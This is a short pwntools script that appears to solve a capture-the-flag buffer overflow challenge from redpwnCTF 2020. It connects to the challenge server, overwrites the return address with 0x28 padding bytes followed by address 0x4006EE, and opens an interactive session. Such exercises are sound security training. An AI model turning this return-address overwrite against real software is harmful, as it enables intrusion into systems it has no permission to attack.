from pwn import*

# io=process('./overflow-0')
io=remote("2020.redpwnc.tf",31255)
payload='a'*0x28+p64(0x4006EE)
io.recvuntil("coffer with?")
io.sendline(payload)
io.interactive()